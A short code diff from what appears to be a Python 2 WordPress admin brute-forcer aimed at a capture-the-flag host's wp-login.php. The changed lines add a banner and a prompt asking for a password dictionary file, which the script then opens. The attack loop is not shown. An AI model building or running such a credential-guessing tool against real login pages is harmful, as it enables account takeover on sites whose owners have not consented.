@@ -14,8 +14,15 @@ import pprint
 #define pretty print object
 pp = pprint.PrettyPrinter(indent=4)
 
-#eventually reading pwd dictionary files
-##TODO
+#program intro for user, and get file name from user
+print "------------------------------------------------------------"
+print "------------------WP-ADMIN-BRUTEFORCER----------------------"
+print "------------------------------------------------------------"
+print "Please type the name of the password file you want to open"
+print "currently available:\n- words.txt [english words dictionary]"
+filename = raw_input("Enter the file name: ")
+
+passwords = open(filename, 'r')
 
 #create base URL to attack
 base_attack_url = "http://ctf.sharif.edu:8082" + "/wp-login.php"
